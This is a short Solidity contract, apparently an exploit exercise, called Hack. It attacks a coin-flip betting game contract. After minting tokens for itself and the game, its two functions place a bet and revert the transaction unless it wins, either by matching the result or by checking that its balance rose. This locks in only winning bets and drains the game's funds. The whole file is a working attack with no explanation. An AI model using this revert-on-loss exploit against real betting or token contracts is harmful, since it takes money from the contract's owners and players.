// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import "./ICoinFlip.sol";
import "./IGameToken.sol";

contract Hack {
    ICoinFlip public coinFlip;
    IGameToken public gameToken;

    constructor(address _coinFlip, address _gameToken) {
        coinFlip = ICoinFlip(_coinFlip);
        gameToken = IGameToken(_gameToken);

        gameToken.mint(_coinFlip, 100000000000000000000000000);
        gameToken.mint(address(this), 1000000000000000000000);
    }

    function hack1(uint256 depAmount, uint256 choice) public {
        gameToken.approve(address(coinFlip), 10000);
        coinFlip.play(10000, 1);

        ICoinFlip.Game memory game = coinFlip.games(0);

        require(choice == game.result, "Hack: You doesnt win");
    }

    function hack2(uint256 depAmount, uint256 choice) public {
        gameToken.approve(address(coinFlip), 10000);
        uint256 balanceBefore = gameToken.balanceOf(address(this));

        coinFlip.play(10000, 1);

        uint256 balanceAfter = gameToken.balanceOf(address(this));

        require(balanceBefore < balanceAfter, "Hack: You doesnt win");
    }
}
